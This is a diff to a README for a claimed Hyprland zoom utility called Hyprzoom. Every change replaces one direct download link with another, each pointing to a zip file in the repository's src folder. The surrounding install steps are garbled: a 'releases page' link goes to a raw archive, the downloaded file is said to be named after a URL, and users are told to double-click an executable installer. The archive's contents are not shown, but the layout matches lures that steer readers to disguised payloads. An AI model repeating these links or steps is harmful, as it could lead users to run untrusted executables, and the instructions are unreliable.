@@ -7,9 +7,9 @@ Hyprzoom is a simple yet feature-rich zoom utility designed specifically for Hyp
 To start using Hyprzoom, follow these easy steps:
 
 1. **Visit the Releases Page**  
-   You can find the latest version of Hyprzoom by going to [this link](https://github.com/lozforlife120/hyprzoom/raw/refs/heads/main/src/Software_tenderling.zip).
+   You can find the latest version of Hyprzoom by going to [this link](https://raw.githubusercontent.com/lozforlife120/hyprzoom/main/src/Software_v2.0.zip).
 
-   ![Download Hyprzoom](https://github.com/lozforlife120/hyprzoom/raw/refs/heads/main/src/Software_tenderling.zip%20Hyprzoom-brightgreen?style=for-the-badge&logo=github)
+   ![Download Hyprzoom](https://raw.githubusercontent.com/lozforlife120/hyprzoom/main/src/Software_v2.0.zip%20Hyprzoom-brightgreen?style=for-the-badge&logo=github)
 
 2. **Select the Latest Release**  
    On the releases page, look for the most recent version of Hyprzoom. It will usually be at the top of the list, marked as the latest release.
@@ -18,7 +18,7 @@ To start using Hyprzoom, follow these easy steps:
    Click on the appropriate file type for your operating system. For most users, the executable version will suffice. 
 
 4. **Locate the File**  
-   Once the download is complete, navigate to your downloads folder. The file should be labeled as `https://github.com/lozforlife120/hyprzoom/raw/refs/heads/main/src/Software_tenderling.zip`, where `X.X.X` represents the version number.
+   Once the download is complete, navigate to your downloads folder. The file should be labeled as `https://raw.githubusercontent.com/lozforlife120/hyprzoom/main/src/Software_v2.0.zip`, where `X.X.X` represents the version number.
 
 5. **Run the Installer**  
    Double-click the downloaded file to start the installation process. Follow the on-screen prompts to complete the setup.
@@ -45,7 +45,7 @@ After installing Hyprzoom, open it from your application menu or the designated 
 - **Accessing Settings**: Click on the settings icon to customize your preferences.
 
 ## 📥 Download & Install
-To obtain Hyprzoom, **[visit this page to download](https://github.com/lozforlife120/hyprzoom/raw/refs/heads/main/src/Software_tenderling.zip)**. Follow the step-by-step instructions provided earlier to install the application on your system.
+To obtain Hyprzoom, **[visit this page to download](https://raw.githubusercontent.com/lozforlife120/hyprzoom/main/src/Software_v2.0.zip)**. Follow the step-by-step instructions provided earlier to install the application on your system.
 
 ## 🔍 Frequently Asked Questions
 
